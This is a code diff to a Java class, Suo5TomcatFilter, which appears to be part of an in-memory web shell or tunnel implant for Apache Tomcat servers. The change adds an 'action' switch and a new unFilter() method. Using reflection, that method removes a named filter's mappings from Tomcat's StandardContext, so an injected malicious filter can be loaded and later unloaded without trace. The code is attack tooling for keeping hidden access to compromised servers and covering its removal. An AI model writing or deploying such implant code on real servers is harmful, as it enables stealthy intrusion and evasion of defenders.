@@ -1,4 +1,5 @@
 import java.io.*;
+import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
@@ -29,6 +30,7 @@ public class Suo5TomcatFilter extends ClassLoader implements Filter, Servlet, Se
     private String urlPattern;
     private String filterName;
     private String userAgent;
+    private String action;
 
     public static HashMap addrs = collectAddr();
     public static HashMap ctx = new HashMap();
@@ -67,6 +69,7 @@ public class Suo5TomcatFilter extends ClassLoader implements Filter, Servlet, Se
             this.urlPattern = getp("urlPattern");
             this.filterName = getp("filterName");
             this.userAgent = getp("userAgent");
+            this.action = getp("action");
             return true;
         } catch (Exception var3) {
             return false;
@@ -74,7 +77,11 @@ public class Suo5TomcatFilter extends ClassLoader implements Filter, Servlet, Se
     }
 
     public String toString() {
-        this.parameterMap.put("result", this.addFilter(this, this.getStandardContext()).getBytes());
+        if (this.action.equals("inject")) {
+            this.parameterMap.put("result", this.addFilter(this, this.getStandardContext()).getBytes());
+        } else {
+            this.parameterMap.put("result", this.unFilter().getBytes());
+        }
         this.parameterMap = null;
         return "";
     }
@@ -697,11 +704,42 @@ public class Suo5TomcatFilter extends ClassLoader implements Filter, Servlet, Se
                     filterMaps[i] = tmpFilterMaps[i];
                 }
             }
-
-            return "ok";
         } catch (Exception var16) {
             return var16.getMessage();
         }
+        return "ok, filterName: " + filterName;
+    }
+
+    public String unFilter() {
+        Object standardContext = this.getStandardContext();
+        ArrayList arrayList = new ArrayList();
+
+        try {
+            if (this.filterName != null) {
+                Object[] filterMaps = (Object[])this.invoke(standardContext, "findFilterMaps", (Object[])null);
+                if (filterMaps.length >= 1) {
+                    for(int i = 0; i < filterMaps.length; ++i) {
+                        Object filterMap = filterMaps[i];
+                        if (!this.filterName.equals(getFieldValue(filterMap, "filterName"))) {
+                            arrayList.add(filterMap);
+                        }
+                    }
+
+                    try {
+                        setFieldValue(standardContext, "filterMaps", arrayList.toArray((Object[]) Array.newInstance(filterMaps.getClass().getComponentType(), 0)));
+                    } catch (Exception var7) {
+                        setFieldValue(getFieldValue(standardContext, "filterMaps"), "array", arrayList.toArray((Object[])Array.newInstance(filterMaps.getClass().getComponentType(), 0)));
+                    }
+                } else {
+                    return "filter number is 0";
+                }
+            } else {
+                return "filterName not is null";
+            }
+        } catch (Exception var8) {
+            return "e: " + var8.getMessage();
+        }
+        return "ok";
     }
 
     public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
